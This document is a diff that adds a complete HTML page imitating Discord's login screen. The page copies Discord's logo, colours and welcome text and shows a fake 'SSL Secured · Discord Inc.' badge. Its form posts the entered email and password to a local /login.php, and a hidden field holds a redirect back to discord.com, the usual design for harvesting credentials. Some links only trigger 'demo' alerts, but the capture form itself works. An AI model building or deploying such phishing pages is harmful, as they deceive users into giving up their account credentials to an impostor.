@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #404eed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #313338;
+            border-radius: 8px;
+            padding: 32px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo svg {
+            width: 50px;
+            height: 50px;
+            fill: white;
+            margin-bottom: 10px;
+        }
+        
+        .logo h1 {
+            color: white;
+            font-size: 28px;
+            font-weight: 600;
+        }
+        
+        .logo p {
+            color: #b5bac1;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card label {
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+        
+        .card input {
+            height: 48px;
+            background: #1e1f22;
+            border: 1px solid #1e1f22;
+            border-radius: 4px;
+            font-size: 16px;
+            padding: 0 12px;
+            margin-bottom: 20px;
+            color: white;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #248046;
+        }
+        
+        .card input::placeholder {
+            color: #5d5f64;
+        }
+        
+        .card button {
+            background: #5865f2;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            color: white;
+            height: 48px;
+            cursor: pointer;
+            margin: 8px 0 16px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #4752c4;
+        }
+        
+        .forgot-row {
+            display: flex;
+            justify-content: flex-end;
+            margin: 10px 0;
+        }
+        
+        .forgot-row a {
+            color: #00a8fc;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-row a:hover {
+            text-decoration: underline;
+        }
+        
+        .qr-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px;
+            background: #1e1f22;
+            border-radius: 4px;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .qr-section:hover {
+            background: #2b2d31;
+        }
+        
+        .qr-icon {
+            font-size: 24px;
+            color: #b5bac1;
+        }
+        
+        .qr-text {
+            color: white;
+            font-weight: 600;
+        }
+        
+        .qr-subtext {
+            font-size: 12px;
+            color: #b5bac1;
+        }
+        
+        .need-account {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #b5bac1;
+        }
+        
+        .need-account a {
+            color: #00a8fc;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .need-account a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #b5bac1;
+        }
+        
+        .footer a {
+            color: #b5bac1;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: white;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #b5bac1;
+            padding-top: 20px;
+            border-top: 1px solid #3b3f45;
+        }
+        
+        @media (max-width: 500px) {
+            .container {
+                padding: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- Discord Logo SVG -->
+            <svg viewBox="0 0 24 24">
+                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515c-.21.386-.456.902-.624 1.315a18.272 18.272 0 0 0-5.616 0 12.595 12.595 0 0 0-.635-1.315 19.718 19.718 0 0 0-4.885 1.515 19.732 19.732 0 0 0-3.476 14.137 19.924 19.924 0 0 0 6.022 2.987c.495-.667.912-1.398 1.276-2.169a12.65 12.65 0 0 1-2.006-.963c.167-.124.33-.254.488-.387a14.442 14.442 0 0 0 12.334 0c.159.133.322.263.488.387-.634.376-1.306.714-2.006.963.364.771.781 1.502 1.276 2.169a19.88 19.88 0 0 0 6.022-2.987 19.705 19.705 0 0 0-3.476-14.137zM8.02 15.33c-1.183 0-2.157-1.07-2.157-2.38 0-1.31.953-2.38 2.157-2.38 1.193 0 2.178 1.07 2.157 2.38 0 1.31-.964 2.38-2.157 2.38zm7.975 0c-1.183 0-2.157-1.07-2.157-2.38 0-1.31.953-2.38 2.157-2.38 1.193 0 2.178 1.07 2.157 2.38 0 1.31-.964 2.38-2.157 2.38z" fill="white"/>
+            </svg>
+            <h1>Discord</h1>
+            <p>Welcome back! We're so excited to see you again!</p>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://discord.com/login">
+                
+                <label for="email">Email or phone number</label>
+                <input type="text" id="email" name="email" placeholder="Email or phone number" required autofocus>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                
+                <div class="forgot-row">
+                    <a href="#" onclick="alert('Password reset demo'); return false;">Forgot your password?</a>
+                </div>
+                
+                <button type="submit">Log In</button>
+            </form>
+            
+            <div class="qr-section" onclick="alert('QR code login demo'); return false;">
+                <span class="qr-icon">📱</span>
+                <div>
+                    <div class="qr-text">Log in with QR Code</div>
+                    <div class="qr-subtext">Scan with Discord mobile app</div>
+                </div>
+            </div>
+            
+            <div class="need-account">
+                Need an account? <a href="#" onclick="alert('Register demo'); return false;">Register</a>
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>SSL Secured</span>
+                <span>•</span>
+                <span>Discord Inc.</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+            <a href="#" onclick="alert('Safety demo'); return false;">Safety</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                alert('Please enter your email and password');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#248046';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#1e1f22';
+                }
+            });
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.getElementById('email').focus();
+        });
+    </script>
+</body>
+</html>
